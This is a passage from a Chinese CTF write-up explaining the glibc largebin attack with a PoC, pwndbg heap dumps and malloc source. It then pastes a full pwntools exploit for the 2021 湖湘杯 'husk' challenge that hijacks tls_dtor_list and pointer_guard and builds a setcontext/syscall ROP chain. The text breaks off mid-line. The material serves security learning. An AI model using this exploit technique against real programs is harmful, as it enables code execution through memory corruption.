*)target);</span><br><span class="line">  printf(<span class="string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(size_t*)target);</span><br><span class="line"></span><br><span class="line">  printf(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  printf(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">assert</span>((size_t)(p2-<span class="number">2</span>) == target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从此poc调试中去学习一下新型largebin attack的工作过程</p>
<p>首先是程序申请了4个堆块分别为0x428、0x18、0x418、0x18</p>
<p>申请的g1和g2是为了防止两个比较大的堆块合并.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x55555575a000</span> PREV_INUSE &#123;</span><br><span class="line">  mchunk_prev size = <span class="number">0x0</span>,</span><br><span class="line">  mchunksize = <span class="number">0x291</span>,</span><br><span class="line">  fd = <span class="number">0x0</span>,</span><br><span class="line">  bk = <span class="number">0x0</span>,</span><br><span class="line">  fd nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk nextsize = <span class="number">0x0</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x55555575a290</span> PREV_INUSE &#123;</span><br><span class="line">  mchunk_prev size = <span class="number">0x0</span>,</span><br><span class="line">  mchunksize = <span class="number">0x431</span>,</span><br><span class="line">  fd = <span class="number">0x0</span>,</span><br><span class="line">  bk = <span class="number">0x0</span>,</span><br><span class="line">  fd nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk nextsize = <span class="number">0x0</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x55555575a6c0</span> 	FASTBIN &#123;</span><br><span class="line">  mchunk_prev size = <span class="number">0x0</span>,</span><br><span class="line">  mchunksize = <span class="number">0x21</span>,</span><br><span class="line">  fd = <span class="number">0x0</span>,</span><br><span class="line">  bk = <span class="number">0x0</span>,</span><br><span class="line">  fd nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk nextsize = <span class="number">0x421</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x55555575a6e0</span> PREV_INUSE &#123;</span><br><span class="line">  mchunk_prev size = <span class="number">0x0</span>,</span><br><span class="line">  mchunksize = <span class="number">0x421</span>,</span><br><span class="line">  fd = <span class="number">0x0</span>,</span><br><span class="line">  bk = <span class="number">0x0</span>,</span><br><span class="line">  fd nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk nextsize = <span class="number">0x0</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x55555575ab00</span> PREV_INUSE &#123;</span><br><span class="line">  mchunk_prev size = <span class="number">0x0</span>,</span><br><span class="line">  mchunksize = <span class="number">0x20501</span>,</span><br><span class="line">  fd = <span class="number">0x0</span>,</span><br><span class="line">  bk = <span class="number">0x0</span>,</span><br><span class="line">  fd nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk nextsize = <span class="number">0x0</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再往后释放了p1堆块，到unsorted bin中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line"><span class="built_in">all</span>: <span class="number">0x55555575a290</span> -&gt; <span class="number">0x7ffff7fc1be0</span> (main arena+<span class="number">96</span>) &lt;- <span class="number">0x55555575a290</span></span><br></pre></td></tr></table></figure>

<p>之后有分配了一个比p1大的堆块使得p1堆块能够进入largebin中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">largebins</span><br><span class="line"><span class="number">0x400</span>: <span class="number">0x55555575a290</span> -&gt; <span class="number">0x7ffff7fc1fd0</span> (main arena+<span class="number">1104</span>) &lt;- <span class="number">0x55555575a290</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>然后程序free p2堆块进入到unsorted bin中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line"><span class="built_in">all</span>: <span class="number">0x55555575a6e0</span> -&gt; <span class="number">0x7ffff7fc1be0</span> (main_arena+<span class="number">96</span>) &lt;- <span class="number">0x55555575abe0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line"><span class="number">0x400</span>: <span class="number">0x55555575a290</span> -&gt; <span class="number">0x7ffff7fc1fd0</span> (main arena+<span class="number">1104</span>) &lt;- <span class="number">0x55555575a290</span></span><br><span class="line">pwndbg&gt;l</span><br></pre></td></tr></table></figure>

<p>然后就是修改了p1chunk的bk_nextsize指向target-0x20</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">修改前：</span><br><span class="line"><span class="number">0000000000000000</span>  <span class="number">0000000000000431</span></span><br><span class="line"><span class="number">00007f</span>fff7fc1fd0  <span class="number">00007f</span>fff7fc1fd0</span><br><span class="line"><span class="number">000055555575</span>a290  <span class="number">000055555575</span>a290</span><br><span class="line"><span class="number">0000000000000000</span>  <span class="number">0000000000000000</span></span><br><span class="line">修改之后：</span><br><span class="line"><span class="number">0000000000000000</span>  <span class="number">0000000000000431</span></span><br><span class="line"><span class="number">00007f</span>fff7fc1fd0  <span class="number">00007f</span>fff7fc1fd0</span><br><span class="line"><span class="number">000055555575</span>a290  <span class="number">00007f</span>ffffffddc0</span><br><span class="line"><span class="number">0000000000000000</span>  <span class="number">0000000000000000</span></span><br><span class="line"><span class="number">0000000000000000</span>  <span class="number">0000000000000000</span></span><br></pre></td></tr></table></figure>

<p>此时target-0x20的值为0x7fffffffddc0。</p>
<p>下面的这一步就要用到如下的代码了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序下一步是malloc了一个比p2还要大的堆块，与p1同理，这个时候p2就会从unsortedbin中放入largebin中。此时就用到了上面的关键代码。victim 是我们的 p2，fwd 为 largebin 的链表头，bck为 largebin 中的最后一个chunk，也就是最小的那个，也就是我们这里的 p1。</p>
<p>取上边代码最关键的三行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>

<p>根据我们分析到的实际问题进行实体性简化：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p2-&gt;fd_nextsize = &amp;p1</span><br><span class="line">p2-&gt;bk_nextsize = p1-&gt;bk_nextsize</span><br><span class="line">p1-&gt;bk_nextsize = bk_nextsize-&gt;fd_nextsize = victim</span><br></pre></td></tr></table></figure>

<p>然后我们是将p1的bk_nextsize改为了target-0x20，所以就可以得到这样的表识：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p2-&gt;fd_nextsize = &amp;p1</span><br><span class="line">p2-&gt;bk_nextsize = p1-&gt;bk_nextsize</span><br><span class="line">p1-&gt;bk_nextsize = (target<span class="number">-0x20</span>)-&gt;fd_nextsize = victim</span><br></pre></td></tr></table></figure>

<p>其实，这三行置零最重要的是最后一行的<code>(target-0x20)-&gt;fd_nextsize = victim</code>这就相当于在(target-0x20)+0x20也就是target的地方写下victim也就是p2的地址。</p>
<h3 id="常见利用方式"><a href="#常见利用方式" class="headerlink" title="常见利用方式"></a>常见利用方式</h3><p>这种写大数的行为，我们可以用来修改global_max_fast,来使程序中分配的堆块都被识别成fastbin，这样来进行一些可以实现的fastbin attack。再恶劣一点的环境来说，我们可以利用其来进行指针的劫持，劫持为我们可控的地方，在可控的地方为造出原本应有的结构体产生劫持程序流的效果（iofile_attack:你直接说我名字得了）。</p>
<h3 id="题目实例"><a href="#题目实例" class="headerlink" title="题目实例"></a>题目实例</h3><p>2021湖湘杯2.34的pwn——husk，chunk申请范围是0x40f到0x500，漏洞是uaf</p>
<p>我们利用这个方式就是：通过两次<code>largebin attack</code>将已知地址写入结构体指针<code>tls_dtor_list</code>和<code>fs:0x30（tcbhead_t-&gt;pointer_guard）</code>里，然后风水布置堆块，伪造<code>dtor_list</code>结构体，接下来就是利用<code>__call_tls_dtors</code>函数来调用我们的指针。</p>
<h4 id="一点回顾"><a href="#一点回顾" class="headerlink" title="一点回顾"></a>一点回顾</h4><p>在系列文章第一篇最后写到了比较方便的gadget去间接控制rdx寄存器就是这里用到了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov     rdx, [rdi+<span class="number">8</span>]</span><br><span class="line">mov     [rsp+<span class="number">0</span>C8h+var_C8], rax</span><br><span class="line">call    qword ptr [rdx+<span class="number">20</span>h]</span><br></pre></td></tr></table></figure>

<p>可以通过这个gadget通过rdi来控制rdx寄存器。</p>
<h4 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h4><p>附上网传exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"><span class="meta">#coding=utf-8</span></span><br><span class="line">from pwn import*</span><br><span class="line">import os</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">binary = <span class="string">&#x27;./pwn&#x27;</span> </span><br><span class="line">main_arena = <span class="number">2198624</span></span><br><span class="line">s = lambda buf: io.send(buf)</span><br><span class="line">sl = lambda buf: io.sendline(buf)</span><br><span class="line">sa = lambda delim, buf: io.sendafter(delim, buf)</span><br><span class="line">sal = lambda delim, buf: io.sendlineafter(delim, buf)</span><br><span class="line">shell = lambda: io.interactive()</span><br><span class="line">r = lambda n=None: io.recv(n)</span><br><span class="line">ra = lambda t=tube.forever:io.recvall(t)</span><br><span class="line">ru = lambda delim: io.recvuntil(delim)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rls = lambda n=<span class="number">2</span>**<span class="number">20</span>: io.recvlines(n)</span><br><span class="line">su = lambda buf,addr:io.success(buf+<span class="string">&quot;==&gt;&quot;</span>+hex(addr))</span><br><span class="line"><span class="meta">#context.terminal = [<span class="string">&#x27;tilix&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span></span><br><span class="line"><span class="meta">#context.terminal = [<span class="string">&#x27;tilix&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-v&#x27;</span>]</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    io=process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io=remote()</span><br><span class="line">elf=ELF(binary)</span><br><span class="line"><span class="meta">#libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">def add(index,size,flag=<span class="number">1</span>):</span><br><span class="line">    pay = b<span class="number">&#x27;</span>\x01<span class="number">&#x27;</span></span><br><span class="line">    pay += p8(index)</span><br><span class="line">    pay += p16(size)</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        pay += b<span class="number">&#x27;</span>\x05<span class="number">&#x27;</span></span><br><span class="line">        ru(<span class="string">&quot;Pls input the opcode\n&quot;</span>)</span><br><span class="line">        s(pay)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> pay</span><br><span class="line"></span><br><span class="line">def <span class="built_in">free</span>(index,flag=<span class="number">1</span>):</span><br><span class="line">    pay = b<span class="number">&#x27;</span>\x02<span class="number">&#x27;</span></span><br><span class="line">    pay += p8(index)</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        pay += b<span class="number">&#x27;</span>\x05<span class="number">&#x27;</span></span><br><span class="line">        ru(<span class="string">&quot;Pls input the opcode\n&quot;</span>)</span><br><span class="line">        s(pay)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> pay</span><br><span class="line"></span><br><span class="line">def show(index,flag=<span class="number">1</span>):</span><br><span class="line">    pay = b<span class="number">&#x27;</span>\x03<span class="number">&#x27;</span></span><br><span class="line">    pay += p8(index)</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        pay += b<span class="number">&#x27;</span>\x05<span class="number">&#x27;</span></span><br><span class="line">        ru(<span class="string">&quot;Pls input the opcode\n&quot;</span>)</span><br><span class="line">        s(pay)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> pay</span><br><span class="line"></span><br><span class="line">def edit(index,size,content,flag=<span class="number">1</span>):</span><br><span class="line">    pay = b<span class="number">&#x27;</span>\x04<span class="number">&#x27;</span></span><br><span class="line">    pay += p8(index)</span><br><span class="line">    pay += p16(size)</span><br><span class="line">    pay += content</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        pay += b<span class="number">&#x27;</span>\x05<span class="number">&#x27;</span></span><br><span class="line">        ru(<span class="string">&quot;Pls input the opcode\n&quot;</span>)</span><br><span class="line">        s(pay)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> pay</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x410</span>)#<span class="number">0</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x460</span>)#<span class="number">1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x418</span>)#<span class="number">2</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x440</span>)#<span class="number">3</span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x410</span>)#<span class="number">4</span></span><br><span class="line">#---<span class="built_in">free</span>(<span class="number">1</span>) and show(<span class="number">1</span>)---</span><br><span class="line">pay = <span class="built_in">free</span>(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">pay += show(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">pay += b<span class="number">&#x27;</span>\x05<span class="number">&#x27;</span></span><br><span class="line">ru(<span class="string">&quot;Pls input the opcode\n&quot;</span>)</span><br><span class="line">s(pay)</span><br><span class="line">#-------------------------</span><br><span class="line">#---------leak------------</span><br><span class="line">libc_base = u64(ru(b<span class="number">&#x27;</span>\x7f<span class="number">&#x27;</span>)[<span class="number">-6</span>:].ljust(<span class="number">0x8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)) - main_arena - <span class="number">96</span></span><br><span class="line">su(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">pointer_guard_addr = libc_base - <span class="number">0x2890</span></span><br><span class="line">tls_dtor_list_addr = libc_base - <span class="number">0x2918</span></span><br><span class="line">su(<span class="string">&#x27;pointer_guard_addr&#x27;</span>,pointer_guard_addr)</span><br><span class="line">su(<span class="string">&#x27;tls_dtor_list_addr&#x27;</span>,tls_dtor_list_addr)</span><br><span class="line">set_context = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span></span><br><span class="line">fh = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]+libc_base</span><br><span class="line">#<span class="number">0x000000000005dfd1</span> : mov rax, rdi ; ret </span><br><span class="line">#<span class="number">0x0000000000169e90</span> : mov rdx, qword ptr [rdi + <span class="number">8</span>] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + <span class="number">0x20</span>]</span><br><span class="line">binsh_addr = libc_base + next(libc.search(b<span class="number">&#x27;</span>/bin/sh\<span class="number">0&#x27;</span>))</span><br><span class="line">ret = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">334</span></span><br><span class="line">syscall = next(libc.search(<span class="keyword">asm</span>(<span class="string">&quot;syscall\nret&quot;</span>)))+libc_base</span><br><span class="line">#---------------------------------------</span><br><span class="line">#------largebin attack and leak heap----</span><br><span class="line">pay = <span class="built_in">free</span>(<span class="number">3</span>,<span class="number">0</span>)</span><br><span class="line">pay += edit(<span class="number">1</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(pointer_guard_addr<span class="number">-0x20</span>),<span class="number">0</span>)</span><br><span class="line">pay += add(<span class="number">5</span>,<span class="number">0x500</span>,<span class="number">0</span>)#<span class="number">5</span></span><br><span class="line">pay += show(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">pay += b<span class="number">&#x27;</span>\x05<span class="number">&#x27;</span></span><br><span class="line">ru(<span class="string">&quot;Pls input the opcode\n&quot;</span>)</span><br><span class="line">s(pay)</span><br><span class="line">ru(<span class="string">&#x27;Malloc Done\n&#x27;</span>)</span><br><span class="line">heap = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\<span class="number">0&#x27;</span>)) - <span class="number">0x2f50</span></span><br><span class="line">su(<span class="string">&#x27;heap&#x27;</span>,heap)</span><br><span class="line">pay = edit(<span class="number">1</span>,<span class="number">0x20</span>,p64(heap+<span class="number">0x2f50</span>)+p64(libc_base+main_arena+<span class="number">1120</span>)+p64(heap+<span class="number">0x2f50</span>)+p64(heap+<span class="number">0x2f50</span>),<span class="number">0</span>)</span><br><span class="line">pay += edit(<span class="number">3</span>,<span class="number">0x20</span>,p64(libc_base+main_arena+<span class="number">1120</span>)+p64(heap+<span class="number">0x26c0</span>)+p64(heap+<span class="number">0x26c0</span>)+p64(heap+<span class="number">0x26c0</span>),<span class="number">0</span>)</span><br><span class="line">pay += b<span class="number">&#x27;</span>\x05<span class="number">&#x27;</span></span><br><span class="line">ru(<span class="string">&quot;Pls input the opcode\n&quot;</span>)</span><br><span class="line">s(pay)</span><br><span class="line">#---------------------------------------</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x460</span>)#<span class="number">1</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x440</span>)#<span class="number">3</span></span><br><span class="line">#------largebin attack ------------------</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line">pay = <span class="built_in">free</span>(<span class="number">3</span>,<span class="number">0</span>)</span><br><span class="line">pay += edit(<span class="number">1</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(tls_dtor_list_addr<span class="number">-0x20</span>),<span class="number">0</span>)</span><br><span class="line">pay += add(<span class="number">5</span>,<span class="number">0x500</span>,<span class="number">0</span>)#<span class="number">5</span></span><br><span class="line">pay += show(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">pay += b<span class="number">&#x27;</span>\x05<span class="number">&#x27;</span></span><br><span class="line">ru(<span class="string">&quot;Pls input the opcode\n&quot;</span>)</span><br><span class="line">s(pay)</span><br><span class="line">ru(<span class="string">&#x27;Malloc Done\n&#x27;</span>)</span><br><span class="line">heap = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\<span class="number">0&#x27;</span>)) - <span class="number">0x2f50</span></span><br><span class="line">su(<span class="string">&#x27;heap&#x27;</span>,heap)</span><br><span class="line">pay = edit(<span class="number">1</span>,<span class="number">0x20</span>,p64(heap+<span class="number">0x2f50</span>)+p64(libc_base+main_arena+<span class="number">1120</span>)+p64(heap+<span class="number">0x2f50</span>)+p64(heap+<span class="number">0x2f50</span>),<span class="number">0</span>)</span><br><span class="line">pay += edit(<span class="number">3</span>,<span class="number">0x20</span>,p64(libc_base+main_arena+<span class="number">1120</span>)+p64(heap+<span class="number">0x26c0</span>)+p64(heap+<span class="number">0x26c0</span>)+p64(heap+<span class="number">0x26c0</span>),<span class="number">0</span>)</span><br><span class="line">pay += b<span class="number">&#x27;</span>\x05<span class="number">&#x27;</span></span><br><span class="line">ru(<span class="string">&quot;Pls input the opcode\n&quot;</span>)</span><br><span class="line">s(pay)</span><br><span class="line">#---------------------------------------</span><br><span class="line">#<span class="number">0x0000000000169e90</span> : mov rdx, qword ptr [rdi + <span class="number">8</span>] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + <span class="number">0x20</span>]</span><br><span class="line">#--------------------------------------</span><br><span class="line">pay = add(<span class="number">1</span>,<span class="number">0x460</span>,<span class="number">0</span>)#<span class="number">1</span></span><br><span class="line">pay+=<span class="built_in">free</span>(<span class="number">2</span>,<span class="number">0</span>)#<span class="number">0</span></span><br><span class="line">pay+=add(<span class="number">2</span>,<span class="number">0x430</span>,<span class="number">0</span>)#<span class="number">1</span></span><br><span class="line">pay += b<span class="number">&#x27;</span>\x05<span class="number">&#x27;</span></span><br><span class="line">ru(<span class="string">&quot;Pls input the opcode\n&quot;</span>)</span><br><span class="line">s(pay)</span><br><span class="line">#--------------------------------------</span><br><span class="line">rop = (<span class="number">0x0000000000169e90</span>+libc_base)^(heap+<span class="number">0x2f50</span>)</span><br><span class="line">rop = ((rop&gt;&gt;(<span class="number">64</span><span class="number">-0x11</span>))|(rop&lt;&lt;<span class="number">0x11</span>))</span><br><span class="line">pay = b<span class="number">&#x27;&#x27;.l</span>just(<span class="number">0x410</span>,b<span class="number">&#x27;</span>s<span class="number">&#x27;</span>)+p64(rop)+p64(heap+<span class="number">0x26d0</span>)</span><br><span class="line">edit(<span class="number">2</span>,len(pay),pay)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(heap+<span class="number">0x26d0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(set_context)</span><br><span class="line">payload = payload.ljust(<span class="number">0x70</span>,b<span class="number">&#x27;</span>\<span class="number">0&#x27;</span>)+p64(fh&amp;<span class="number">0xfffffffffffff000</span>)<span class="meta">#rsi</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x68</span>,b<span class="number">&#x27;</span>\<span class="number">0&#x27;</span>)+p64(<span class="number">0</span>)<span class="meta">#rdi</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x88</span>,b<span class="number">&#x27;</span>\<span class="number">0&#x27;</span>)+p64(<span class="number">0x2000</span>)<span class="meta">#rdx</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>,b<span class="number">&#x27;</span>\<span class="number">0&#x27;</span>)+p64((fh&amp;<span class="number">0xfffffffffffff000</span>)+<span class="number">8</span>)<span class="meta">#bytes(frame)</span></span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>,b<span class="number">&#x27;</span>\<span class="number">0&#x27;</span>)+p64(syscall)<span class="meta">#rip</span></span><br><span class="line">edit(<span 